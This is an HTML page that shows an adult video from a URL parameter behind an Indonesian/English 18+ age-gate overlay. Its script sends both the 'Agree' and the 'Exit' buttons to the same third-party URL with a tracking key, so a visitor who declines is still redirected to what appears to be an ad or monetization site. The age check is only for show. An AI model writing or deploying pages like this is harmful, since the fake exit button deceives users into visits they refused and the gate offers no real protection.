<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Watch</title>

<style>
html,body{
  margin:0;
  padding:0;
  width:100%;
  height:100%;
  background:#000;
  overflow:hidden;
}

/* VIDEO FULL */
video{
  position:fixed;
  top:0;left:0;
  width:100%;
  height:100%;
  object-fit:cover;
  background:#000;
}

/* GATE OVERLAY */
#gate{
  position:fixed;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  background:rgba(0,0,0,.35); /* transparan */
  backdrop-filter: blur(2px);
  z-index:999;
}

/* BOX GATE */
.gate-box{
  width:85%;
  max-width:360px;
  background:rgba(0,0,0,.75);
  border-radius:14px;
  padding:20px;
  color:#fff;
  text-align:center;
  box-shadow:0 10px 40px rgba(0,0,0,.6);
}

.gate-box h2{
  font-size:20px;
  margin:0 0 8px;
}

.gate-box p{
  font-size:14px;
  opacity:.85;
  margin-bottom:18px;
}

.btn{
  display:block;
  width:100%;
  padding:12px;
  border-radius:8px;
  font-size:16px;
  border:none;
  margin-bottom:10px;
}

.btn-yes{
  background:#1e88ff;
  color:#fff;
}

.btn-no{
  background:#444;
  color:#fff;
}
</style>
</head>

<body>

<video id="video" playsinline preload="metadata"></video>

<div id="gate">
  <div class="gate-box">
    <h2 id="title">Apakah Anda sudah 18+?</h2>
    <p id="desc">Konten ini hanya untuk pengguna dewasa</p>
    <button class="btn btn-yes" id="agree">Saya Setuju</button>
    <button class="btn btn-no" id="exit">Keluar</button>
  </div>
</div>

<script>
(function(){
  const params = new URLSearchParams(location.search);
  let id = params.get("id");
  if(!id) return;

  if(!id.endsWith(".mp4")) id += ".mp4";
  const videoUrl = "https://cdn.videy.co/" + id;
  const video = document.getElementById("video");
  const gate = document.getElementById("gate");

  video.src = videoUrl;

  const REDIRECT = "https://biteanxiously.com/mw1hyfqyv?key=09409c2256c55cc0edbdfd9a8c3e242c";
  const KEY = "gate_" + id;

  /* AUTO BAHASA */
  if(!navigator.language.toLowerCase().startsWith("id")){
    document.getElementById("title").innerText = "Are you 18+?";
    document.getElementById("desc").innerText = "This content is for adults only";
    document.getElementById("agree").innerText = "I Agree";
    document.getElementById("exit").innerText = "Exit";
  }

  /* JIKA SUDAH PERNAH SETUJU */
  if(sessionStorage.getItem(KEY)){
    gate.style.display = "none";
    video.play().catch(()=>{});
  }

  function proceed(){
    sessionStorage.setItem(KEY,"1");
    location.href = REDIRECT;
  }

  document.getElementById("agree").onclick = proceed;
  document.getElementById("exit").onclick = proceed;

})();
</script>

</body>
</html>
